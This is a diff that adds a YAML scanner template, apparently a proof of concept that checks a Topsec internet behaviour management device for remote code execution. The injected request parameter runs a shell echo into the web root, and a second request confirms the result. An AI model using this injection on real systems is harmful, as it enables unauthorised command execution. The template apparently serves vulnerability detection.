@@ -1,0 +1,19 @@
+name: 天融信上网行为管理RCE
+set:
+  r1: randomLowercase(20)
+  r2: randomLowercase(20)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /view/IPV6/naborTable/static_convert.php?blocks[0]=||  echo '{{r2}}' >> /var/www/html/{{r1}}.txt%0A
+    expression: response.status == 200 && response.body.bcontains(bytes(r1))
+  r1:
+    request:
+      method: GET
+      path: /{{r1}}.txt
+    expression: response.status == 200 && response.body.bcontains(bytes(r2))
+expression: r0() && r1()
+detail:
+    links:
+        - https://mp.weixin.qq.com/s/s_bv4k92Zz-kZFieKN2Qlg
